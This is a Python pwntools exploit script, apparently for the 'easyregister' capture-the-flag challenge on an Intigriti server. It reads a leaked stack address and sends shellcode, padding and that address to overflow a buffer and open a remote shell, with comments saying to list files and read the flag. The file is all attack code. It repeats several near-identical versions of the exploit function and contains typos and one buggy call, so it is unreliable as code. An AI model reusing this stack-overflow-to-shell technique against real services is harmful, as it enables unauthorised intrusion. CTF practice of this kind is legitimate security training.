# coding: utf-8
from pwn import *
context.bit = 64
context.bits = 64
shell = asm(shellcraft.sh())
context.aarch="amd64"
context.arch="amd64"
shell = asm(shellcraft.sh())
def fun():
    from pwn import *
p=remote("easyregister.ctf.intigriti.io", 7777)

resp=p.recvuntil("listing at ")
leak=p.recvuntil(".")
#leak looks like "0xffbeea50\n"

intleak = int(leak,16)
lenth = 80 - len(shell)
p.sendline(p64(shell)+b"a"*lenth+b"a"*8+p64(intleak))#for nice unprintable payloads
p.interactive()
#if you have a shell then you can now type `ls` and `cat flag`
def fun():

    p=remote("easyregister.ctf.intigriti.io", 7777)

    resp=p.recvuntil("listing at ")
    leak=p.recvuntil(".")
    #leak looks like "0xffbeea50\n"

    intleak = int(leak,16)
    lenth = 80 - len(shell)
    p.sendline(p64(shell)+b"a"*lenth+b"a"*8+p64(intleak))#for nice unprintable payloads
    p.interactive()
    #if you have a shell then you can now type `ls` and `cat flag`
    
fun()
def fun():

    p=remote("easyregister.ctf.intigriti.io", 7777)

    resp=p.recvuntil("listing at ")
    leak=p.recvuntil(".")
    #leak looks like "0xffbeea50\n"
    leak = leak[:-1]
    intleak = int(leak,16)
    lenth = 80 - len(shell)
    p.sendline(p64(shell)+b"a"*lenth+b"a"*8+p64(intleak))#for nice unprintable payloads
    p.interactive()
    #if you have a shell then you can now type `ls` and `cat flag`
    
fun()
def fun():

    p=remote("easyregister.ctf.intigriti.io", 7777)

    resp=p.recvuntil("listing at ")
    leak=p.recvuntil(".")
    #leak looks like "0xffbeea50\n"
    leak = leak[:-1]
    intleak = int(leak,16)
    lenth = 80 - len(shell)
    p.sendline(shell+b"a"*lenth+b"a"*8+p64(intleak))#for nice unprintable payloads
    p.interactive()
    #if you have a shell then you can now type `ls` and `cat flag`
    
fun()
